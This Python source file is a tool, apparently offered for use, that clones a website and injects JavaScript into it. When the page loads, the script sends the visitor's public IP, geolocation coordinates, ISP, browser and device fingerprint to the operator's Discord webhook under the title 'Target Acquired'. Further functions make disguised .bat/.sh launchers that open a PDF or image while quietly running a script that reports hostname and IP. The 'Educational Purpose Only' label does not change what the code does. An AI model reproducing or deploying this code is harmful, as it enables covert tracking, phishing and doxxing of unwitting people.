#!/usr/bin/env python3
import os
import sys
import subprocess
import venv
from pathlib import Path
import logging
import json
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import tkinter as tk
from tkinter import filedialog

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
console = Console()

def select_file(title="Select File", filetypes=None):
    """Open file picker dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def select_save_file(title="Save File As", filetypes=None):
    """Open save file dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.asksaveasfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def get_venv_python():
    """Get the Python executable path from virtual environment."""
    if sys.platform == "win32":
        return "venv\\Scripts\\python.exe"
    return "venv/bin/python"

def check_venv():
    """Check if virtual environment exists and is valid."""
    venv_path = Path("venv")
    if not venv_path.exists():
        return False
    
    python_executable = get_venv_python()
    if not os.path.exists(python_executable):
        return False
    
    try:
        # Try to import all required packages to verify the environment
        subprocess.check_call([python_executable, "-c", "import requests; import PyPDF2; import bs4; import rich"])
        return True
    except subprocess.CalledProcessError:
        return False

def install_package(pip_executable, python_executable, package):
    """Install a package with error handling."""
    try:
        console.print(f"[yellow]Installing {package}...[/yellow]")
        subprocess.check_call([pip_executable, "install", "--no-cache-dir", package])
        console.print(f"[green]Successfully installed {package}[/green]")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Error installing {package}: {str(e)}[/red]")
        # Try alternative installation method
        try:
            console.print(f"[yellow]Trying alternative installation method for {package}...[/yellow]")
            subprocess.check_call([python_executable, "-m", "pip", "install", "--no-cache-dir", package])
            console.print(f"[green]Successfully installed {package} using alternative method[/green]")
            return True
        except subprocess.CalledProcessError as e2:
            console.print(f"[red]Failed to install {package} with alternative method: {str(e2)}[/red]")
            return False

def setup_environment():
    """Set up the virtual environment and install requirements."""
    try:
        # Create new virtual environment if needed
        venv_path = Path("venv")
        if not venv_path.exists():
            console.print("[yellow]Creating new virtual environment...[/yellow]")
            venv.create("venv", with_pip=True)
        
        # Get the correct Python executable path
        python_executable = get_venv_python()
        pip_executable = "venv\\Scripts\\pip.exe" if sys.platform == "win32" else "venv/bin/pip"
        
        # Upgrade pip first
        console.print("[yellow]Upgrading pip...[/yellow]")
        subprocess.check_call([python_executable, "-m", "pip", "install", "--upgrade", "pip"])
        
        # Install required packages with specific versions
        console.print("[yellow]Installing required packages...[/yellow]")
        packages = [
            "requests==2.31.0",
            "PyPDF2==3.0.1",
            "beautifulsoup4==4.12.2",
            "rich==13.7.0"
        ]
        
        for package in packages:
            try:
                console.print(f"[yellow]Installing {package}...[/yellow]")
                subprocess.check_call([python_executable, "-m", "pip", "install", "--no-cache-dir", package])
                console.print(f"[green]Successfully installed {package}[/green]")
            except subprocess.CalledProcessError as e:
                console.print(f"[red]Error installing {package}: {str(e)}[/red]")
                return None
        
        # Verify installations
        console.print("[yellow]Verifying package installations...[/yellow]")
        try:
            subprocess.check_call([python_executable, "-c", "import requests; import PyPDF2; import bs4; import rich"])
            console.print("[green]All packages installed successfully![/green]")
            return python_executable
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error verifying package installations: {str(e)}[/red]")
            return None
            
    except Exception as e:
        console.print(f"[red]Error during setup: {str(e)}[/red]")
        return None

def run_in_venv():
    """Run the script in the virtual environment."""
    python_executable = setup_environment()
    if not python_executable:
        console.print("[red]Failed to set up the environment. Please check your Python installation and try again.[/red]")
        sys.exit(1)
    
    # Get the current script path
    script_path = os.path.abspath(__file__)
    
    # Run the script in the virtual environment
    console.print("[green]Starting IP Tracker Tool in virtual environment...[/green]")
    subprocess.call([python_executable, script_path, "--in-venv"])

def load_config():
    """Load configuration from config.json"""
    config_path = Path("config.json")
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading config: {str(e)}")
    return {"webhook_url": None}

def save_config(config):
    """Save configuration to config.json"""
    try:
        with open("config.json", 'w') as f:
            json.dump(config, f)
    except Exception as e:
        logger.error(f"Error saving config: {str(e)}")

def get_webhook_url():
    """Get webhook URL from config or user input"""
    config = load_config()
    if config.get("webhook_url"):
        if Confirm.ask("\n[bold blue]Use existing webhook URL?[/bold blue]"):
            return config["webhook_url"]
    
    while True:
        webhook_url = Prompt.ask("\n[bold blue]Enter your Discord webhook URL[/bold blue]")
        if webhook_url.startswith('https://discord.com/api/webhooks/'):
            config["webhook_url"] = webhook_url
            save_config(config)
            return webhook_url
        console.print("[red]Invalid webhook URL. Please enter a valid Discord webhook URL.[/red]")

def show_file_location(file_path):
    """Show the full path of the created file"""
    full_path = os.path.abspath(file_path)
    console.print("\n[bold green]Created File Location:[/bold green]")
    console.print(f"[yellow]{full_path}[/yellow]")
    console.print("\n[bold blue]You can now share this file to track IP addresses.[/bold blue]")

def create_tracking_pdf(original_pdf, webhook_url):
    """Create a PDF that tracks IP when opened"""
    try:
        # Create a copy of the original PDF
        output_pdf = f"tracking_{os.path.basename(original_pdf)}"
        
        # Create a Python script that will be embedded in the PDF
        tracking_script = f"""
import requests
import socket
import platform
import json
import os
import subprocess
import time

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        machine = platform.machine()
        processor = platform.processor()
        return {{
            'hostname': hostname,
            'local_ip': local_ip,
            'system': system,
            'machine': machine,
            'processor': processor
        }}
    except Exception as e:
        return None

def send_to_discord():
    try:
        system_info = get_system_info()
        message_parts = ["PDF Opened - IP Information:"]
        
        if system_info:
            message_parts.extend([
                f"Hostname: {{system_info['hostname']}}",
                f"Local IP: {{system_info['local_ip']}}",
                f"OS: {{system_info['system']}}",
                f"Machine: {{system_info['machine']}}",
                f"Processor: {{system_info['processor']}}"
            ])
        
        # Get public IP
        ip_response = requests.get('https://api.ipify.org?format=json')
        public_ip = ip_response.json()['ip']
        message_parts.append(f"Public IP: {{public_ip}}")
        
        # Get location info
        details_response = requests.get(f'http://ip-api.com/json/{{public_ip}}')
        details = details_response.json()
        
        if details['status'] == 'success':
            message_parts.extend([
                f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
                f"ISP: {{details.get('isp', 'Unknown')}}",
                f"Coordinates: {{details.get('lat', 'Unknown')}}, {{details.get('lon', 'Unknown')}}"
            ])
        
        message = "\\n".join(message_parts)
        requests.post('{webhook_url}', json={{"content": message}})
    except Exception as e:
        pass

if __name__ == "__main__":
    # Wait a bit to ensure the PDF viewer has started
    time.sleep(1)
    send_to_discord()
"""
        
        # Create a temporary Python script
        script_path = "temp_tracking.py"
        with open(script_path, 'w') as f:
            f.write(tracking_script)
        
        # Create a batch file to run the script when PDF is opened
        if sys.platform == "win32":
            batch_content = f"""@echo off
start "" "{output_pdf}"
timeout /t 1 /nobreak
python "{script_path}"
"""
            batch_file = f"open_{os.path.basename(output_pdf)}.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
        else:
            shell_content = f"""#!/bin/bash
xdg-open "{output_pdf}"
sleep 1
python3 "{script_path}"
"""
            shell_file = f"open_{os.path.basename(output_pdf)}.sh"
            with open(shell_file, 'w') as f:
                f.write(shell_content)
            os.chmod(shell_file, 0o755)  # Make shell script executable
        
        # Copy the original PDF
        import shutil
        shutil.copy2(original_pdf, output_pdf)
        
        console.print(f"[green]Successfully created tracking PDF![/green]")
        console.print("\n[bold yellow]Important:[/bold yellow]")
        console.print("1. Share the [bold]open_tracking_*.bat[/bold] file (Windows) or [bold]open_tracking_*.sh[/bold] file (Linux/Mac)")
        console.print("2. When someone opens this file, it will:")
        console.print("   - Open the PDF")
        console.print("   - Send tracking information to your Discord webhook")
        show_file_location(output_pdf)
        return output_pdf
    except Exception as e:
        console.print(f"[red]Error creating tracking PDF: {str(e)}[/red]")
        return None

def create_tracking_image(original_image, webhook_url):
    """Create an image that tracks IP when opened"""
    try:
        # Create a copy of the original image
        output_image = f"tracking_{os.path.basename(original_image)}"
        
        # Create a Python script that will be embedded in the image
        tracking_script = f"""
import requests
import socket
import platform
import json
import os
import subprocess
import time

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        machine = platform.machine()
        processor = platform.processor()
        return {{
            'hostname': hostname,
            'local_ip': local_ip,
            'system': system,
            'machine': machine,
            'processor': processor
        }}
    except Exception as e:
        return None

def send_to_discord():
    try:
        system_info = get_system_info()
        message_parts = ["Image Opened - IP Information:"]
        
        if system_info:
            message_parts.extend([
                f"Hostname: {{system_info['hostname']}}",
                f"Local IP: {{system_info['local_ip']}}",
                f"OS: {{system_info['system']}}",
                f"Machine: {{system_info['machine']}}",
                f"Processor: {{system_info['processor']}}"
            ])
        
        # Get public IP
        ip_response = requests.get('https://api.ipify.org?format=json')
        public_ip = ip_response.json()['ip']
        message_parts.append(f"Public IP: {{public_ip}}")
        
        # Get location info
        details_response = requests.get(f'http://ip-api.com/json/{{public_ip}}')
        details = details_response.json()
        
        if details['status'] == 'success':
            message_parts.extend([
                f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
                f"ISP: {{details.get('isp', 'Unknown')}}",
                f"Coordinates: {{details.get('lat', 'Unknown')}}, {{details.get('lon', 'Unknown')}}"
            ])
        
        message = "\\n".join(message_parts)
        requests.post('{webhook_url}', json={{"content": message}})
    except Exception as e:
        pass

if __name__ == "__main__":
    # Wait a bit to ensure the image viewer has started
    time.sleep(1)
    send_to_discord()
"""
        
        # Create a temporary Python script
        script_path = "temp_tracking.py"
        with open(script_path, 'w') as f:
            f.write(tracking_script)
        
        # Create a batch file to run the script when image is opened
        if sys.platform == "win32":
            batch_content = f"""@echo off
start "" "{output_image}"
timeout /t 1 /nobreak
python "{script_path}"
"""
            batch_file = f"open_{os.path.basename(output_image)}.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
        else:
            shell_content = f"""#!/bin/bash
xdg-open "{output_image}"
sleep 1
python3 "{script_path}"
"""
            shell_file = f"open_{os.path.basename(output_image)}.sh"
            with open(shell_file, 'w') as f:
                f.write(shell_content)
            os.chmod(shell_file, 0o755)  # Make shell script executable
        
        # Copy the original image
        import shutil
        shutil.copy2(original_image, output_image)
        
        console.print(f"[green]Successfully created tracking image![/green]")
        console.print("\n[bold yellow]Important:[/bold yellow]")
        console.print("1. Share the [bold]open_tracking_*.bat[/bold] file (Windows) or [bold]open_tracking_*.sh[/bold] file (Linux/Mac)")
        console.print("2. When someone opens this file, it will:")
        console.print("   - Open the image")
        console.print("   - Send tracking information to your Discord webhook")
        show_file_location(output_image)
        return output_image
    except Exception as e:
        console.print(f"[red]Error creating tracking image: {str(e)}[/red]")
        return None

def create_tracking_website(url, webhook_url):
    """Create a cloned website that tracks IP when visited"""
    try:
        import requests
        from bs4 import BeautifulSoup
        from urllib.parse import urlparse
        
        # Get the website content
        response = requests.get(url)
        response.raise_for_status()
        
        # Parse the HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Get the domain name from URL
        parsed_url = urlparse(url)
        domain_name = parsed_url.netloc.replace('www.', '')
        
        # Add tracking script with enhanced information gathering and error handling
        tracking_script = f"""
<script>
async function getDetailedInfo() {{
    const info = {{
        // Browser Information
        browser: {{
            name: navigator.appName,
            version: navigator.appVersion,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            vendor: navigator.vendor,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        }},
        
        // Screen Information
        screen: {{
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown'
        }},
        
        // Device Information
        device: {{
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            connection: navigator.connection ? {{
                type: navigator.connection.type,
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            }} : 'unknown'
        }},
        
        // Time Information
        time: {{
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            localTime: new Date().toLocaleString()
        }}
    }};
    
    return info;
}}

async function trackIP() {{
    try {{
        console.log('Starting IP tracking...');
        
        // Get IP and location
        console.log('Fetching IP address...');
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (!ipResponse.ok) throw new Error('Failed to fetch IP');
        const ipData = await ipResponse.json();
        const publicIP = ipData.ip;
        console.log('IP fetched:', publicIP);
        
        console.log('Fetching location details...');
        const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
        if (!detailsResponse.ok) throw new Error('Failed to fetch location details');
        const details = await detailsResponse.json();
        console.log('Location details fetched');
        
        // Get detailed system information
        console.log('Gathering system information...');
        const systemInfo = await getDetailedInfo();
        console.log('System information gathered');
        
        // Create a professional Discord message with embeds
        const embeds = [
            {{
                title: "🔒 Target Acquired",
                description: "```diff\\n+ New Target Detected\\n- IP Address: " + publicIP + "\\n```",
                color: 0x00ff00,
                thumbnail: {{
                    url: "https://i.imgur.com/8j3qX5N.png"
                }},
                fields: [
                    {{
                        name: "🌐 Target Location",
                        value: `\\`\\`\\`\\n` +
                               `[+] IP: ${{publicIP}}\\n` +
                               `[+] Location: ${{details.city || 'Unknown'}}, ${{details.country || 'Unknown'}}\\n` +
                               `[+] Coordinates: ${{details.lat || 'Unknown'}}, ${{details.lon || 'Unknown'}}\\n` +
                               `[+] ISP: ${{details.isp || 'Unknown'}}\\n` +
                               `[+] AS: ${{details.as || 'Unknown'}}\\n` +
                               `[+] Timezone: ${{details.timezone || 'Unknown'}}\\n` +
                               `\\`\\`\\``,
                        inline: false
                    }},
                    {{
                        name: "💻 System Profile",
                        value: `\\`\\`\\`\\n` +
                               `[+] Browser: ${{systemInfo.browser.name}} ${{systemInfo.browser.version}}\\n` +
                               `[+] Platform: ${{systemInfo.browser.platform}}\\n` +
                               `[+] Language: ${{systemInfo.browser.language}}\\n` +
                               `[+] Screen: ${{systemInfo.screen.width}}x${{systemInfo.screen.height}}\\n` +
                               `[+] Cores: ${{systemInfo.device.hardwareConcurrency}}\\n` +
                               `[+] Memory: ${{systemInfo.device.deviceMemory}}GB\\n` +
                               `\\`\\`\\``,
                        inline: false
                    }},
                    {{
                        name: "📱 Device Fingerprint",
                        value: `\\`\\`\\`\\n` +
                               `[+] User Agent: ${{systemInfo.browser.userAgent}}\\n` +
                               `[+] Touch Points: ${{systemInfo.device.maxTouchPoints}}\\n` +
                               `[+] Connection: ${{systemInfo.device.connection.type || 'Unknown'}}\\n` +
                               `[+] Speed: ${{systemInfo.device.connection.downlink || 'Unknown'}} Mbps\\n` +
                               `\\`\\`\\``,
                        inline: false
                    }},
                    {{
                        name: "⏰ Time Data",
                        value: `\\`\\`\\`\\n` +
                               `[+] Timezone: ${{systemInfo.time.timezone}}\\n` +
                               `[+] Local Time: ${{systemInfo.time.localTime}}\\n` +
                               `\\`\\`\\``,
                        inline: false
                    }}
                ],
                timestamp: new Date().toISOString(),
                footer: {{
                    text: "🔍 IP Tracker • Educational Purpose Only",
                    icon_url: "https://i.imgur.com/8j3qX5N.png"
                }}
            }}
        ];
        
        // Send to Discord
        console.log('Sending data to Discord...');
        const discordResponse = await fetch('{webhook_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ embeds }})
        }});
        
        if (!discordResponse.ok) {{
            const errorText = await discordResponse.text();
            throw new Error(`Discord API error: ${{discordResponse.status}} - ${{errorText}}`);
        }}
        
        console.log('Data successfully sent to Discord');
    }} catch (error) {{
        console.error('Tracking error:', error);
        // Try to send error to Discord
        try {{
            await fetch('{webhook_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    content: `❌ Tracking Error: ${{error.message}}`
                }})
            }});
        }} catch (discordError) {{
            console.error('Failed to send error to Discord:', discordError);
        }}
    }}
}}

// Execute tracking when page loads
console.log('Tracking script loaded');
window.addEventListener('load', () => {{
    console.log('Page loaded, starting tracking...');
    trackIP();
}});
</script>
"""
        # Add the tracking script to the HTML
        soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
        
        # Save the modified website with the domain name
        output_file = f"{domain_name}.html"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        console.print(f"[green]Successfully created tracking website![/green]")
        console.print("\n[bold yellow]Important:[/bold yellow]")
        console.print(f"1. Share the [bold]{output_file}[/bold] file")
        console.print("2. When someone visits this website, you'll receive a professional Discord message with:")
        console.print("   - IP address and location details (including coordinates)")
        console.print("   - System and browser information")
        console.print("   - Device specifications")
        console.print("   - Time and timezone data")
        console.print("\n[bold red]Debugging Tips:[/bold red]")
        console.print("1. Open the browser's Developer Tools (F12)")
        console.print("2. Check the Console tab for any error messages")
        console.print("3. Check the Network tab to see if requests are being made")
        show_file_location(output_file)
        return output_file
    except Exception as e:
        console.print(f"[red]Error creating tracking website: {str(e)}[/red]")
        return None

def show_menu():
    console.clear()
    console.print(Panel.fit(
        "[bold blue]IP Tracker Tool[/bold blue]\n"
        "[italic]Educational Purpose Only[/italic]",
        title="Welcome",
        border_style="blue"
    ))
    
    table = Table(show_header=False, box=None)
    table.add_row("1", "Create Tracking Website")
    table.add_row("2", "Exit")
    console.print(table)
    
    while True:
        try:
            choice = Prompt.ask("\n[bold blue]Enter your choice[/bold blue]", choices=["1", "2"])
            return int(choice)
        except ValueError:
            console.print("[red]Please enter a valid number.[/red]")

def install_required_packages():
    """Install required packages globally"""
    try:
        console.print("[yellow]Checking and installing required packages...[/yellow]")
        
        # List of required packages
        packages = [
            "requests==2.31.0",
            "PyPDF2==3.0.1",
            "beautifulsoup4==4.12.2",
            "rich==13.7.0"
        ]
        
        # Try installing with pip first
        for package in packages:
            try:
                console.print(f"[yellow]Installing {package}...[/yellow]")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--no-cache-dir", package])
                console.print(f"[green]Successfully installed {package}[/green]")
            except subprocess.CalledProcessError as e:
                console.print(f"[red]Error installing {package}: {str(e)}[/red]")
                return False
        
        # Verify installations
        console.print("[yellow]Verifying package installations...[/yellow]")
        try:
            subprocess.check_call([sys.executable, "-c", "import requests; import PyPDF2; import bs4; import rich"])
            console.print("[green]All packages installed successfully![/green]")
            return True
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error verifying package installations: {str(e)}[/red]")
            return False
            
    except Exception as e:
        console.print(f"[red]Error during package installation: {str(e)}[/red]")
        return False

def main():
    # Set up virtual environment and install packages
    python_executable = setup_environment()
    if not python_executable:
        console.print("[red]Failed to set up the environment. Please check your Python installation and try again.[/red]")
        return
    
    # Get the current script path
    script_path = os.path.abspath(__file__)
    
    # Run the script in the virtual environment
    console.print("[green]Starting IP Tracker Tool in virtual environment...[/green]")
    subprocess.call([python_executable, script_path, "--in-venv"])

if __name__ == "__main__":
    if "--in-venv" in sys.argv:
        # This is the code that runs inside the virtual environment
        webhook_url = get_webhook_url()
        
        while True:
            choice = show_menu()
            
            if choice == 1:
                url = Prompt.ask("\n[bold blue]Enter the website URL[/bold blue]")
                if url.startswith(('http://', 'https://')):
                    create_tracking_website(url, webhook_url)
                else:
                    console.print("[red]Invalid URL. Please enter a valid URL starting with http:// or https://[/red]")
            
            elif choice == 2:
                console.print(Panel.fit(
                    "[bold green]Thank you for using IP Tracker Tool![/bold green]",
                    title="Goodbye",
                    border_style="green"
                ))
                break
            
            if Confirm.ask("\n[bold blue]Do you want to continue?[/bold blue]"):
                continue
            break
    else:
        # This is the code that runs first to set up the environment
        main() 